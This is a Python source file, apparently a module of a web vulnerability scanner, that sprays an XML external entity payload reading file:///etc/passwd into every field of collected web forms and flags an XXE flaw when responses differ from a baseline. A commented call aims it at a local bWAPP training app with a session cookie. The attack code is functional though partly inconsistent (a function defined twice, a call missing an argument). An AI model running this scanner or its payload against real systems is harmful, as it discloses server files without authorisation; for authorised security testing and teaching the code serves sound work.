import requests
from bs4 import BeautifulSoup
import mechanize
from form_urls import *
from form_input import *
import chk

#payload=["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"]
#error=['']
#headers={'Content-Type':'application/xml'}
#list_of_urls=iterate_through_file('demofile.txt')


def make_req(data,payloa):
 d={}
 for i in data:
  d[i]=payloa
 return d

def normalGetResponse(url,data,cookie):
 d=make_req(data,'helloIamGoodThnkYou')
 if cookie:
  request=requests.get(url,d,cookies=cookie)
 else:
  request=requests.get(url,d)
 return len(request.text),request.status_code

def normalPostResponse(url,data,cookie):
 d=make_req(data,'helloIamGood')
 if cookie:
  request=requests.post(url,d,cookies=cookie)
 else:
  request=requests.post(url,d)
 return len(request.text),request.status_code

def xxeInjection(req,d,length,status_code):
 flag=False
 if abs(len(req.text)-length)>20 or (status_code !=req.status_code):
  print("xxe found on the url:"+req.url)
  print("payload:"+str(d))
  flag=True
 return flag

def xxe():
 payload=["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"]
 error=['']
 headers={'Content-Type':'application/xml'}
 list_of_urls=iterate_through_file('demofile.txt')
 for i in list_of_urls:
  input_req=return_input(i,'')
  for k in range(0,len(input_req),3):
   if input_req[k+1]=='post' or input_req[k+1]=='POST':
    length,status_code=normalPostResponse(input_req[k],input_req[k+2])
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.post(input_req[k],data=d,headers=headers)
     if xxeInjection(request,d,length,status_code):
      break
   elif input_req[k+1]=='get' or input_req[k+1]=='GET':
    length,status_code=normalGetResponse(input_req[k],input_req[k+2])
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.get(input_req[k],data=d,headers=headers)
     if xxeInjection(request,d,length,status_code):
      break 

def xxeC(cookie):
 payload=["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"]
 error=['']
 headers={'Content-Type':'application/xml'}
 list_of_urls=iterate_through_file('demofile.txt')
 for i in list_of_urls:
  input_req=return_input(i,cookie)
  for k in range(0,len(input_req),3):
   if input_req[k+1]=='post' or input_req[k+1]=='POST':
    length,status_code=normalPostResponse(input_req[k],input_req[k+2],cookie)
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.post(input_req[k],data=d,headers=headers,cookies=cookie)
     if xxeInjection(request,d,length,status_code):
      break
   elif input_req[k+1]=='get' or input_req[k+1]=='GET':
    length,status_code=normalGetResponse(input_req[k],input_req[k+2],cookie)
    for pay in payload:
     d=make_req(input_req[k+2],pay)
     request=requests.get(input_req[k],data=d,headers=headers,cookies=cookie)
     if xxeInjection(request,d,length,status_code):
      break 

def xxeC(url,cookie):
 payload=["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"]
 error=['']
 headers={'Content-Type':'text/xml'}
 #list_of_urls=iterate_through_file('demofile.txt')
 #for i in list_of_urls:
 input_req=return_input(url,cookie)
 for k in range(0,len(input_req),3):
  if input_req[k+1]=='post' or input_req[k+1]=='POST':
   length,status_code=normalPostResponse(input_req[k],input_req[k+2],cookie)
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    request=requests.post(input_req[k],data=d,headers=headers,cookies=cookie)
    if xxeInjection(request,d,length,status_code):
     break
  elif input_req[k+1]=='get' or input_req[k+1]=='GET':
   length,status_code=normalGetResponse(input_req[k],input_req[k+2],cookie)
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    request=requests.get(input_req[k],data=d,headers=headers,cookies=cookie)
    if xxeInjection(request,d,length,status_code):
     break 

#xxeC("http://localhost/bWAPP/xxe-1.php",chk.getCookie("security_level=0; PHPSESSID=htlvtb5uhmphoiup6ojb608f4o"))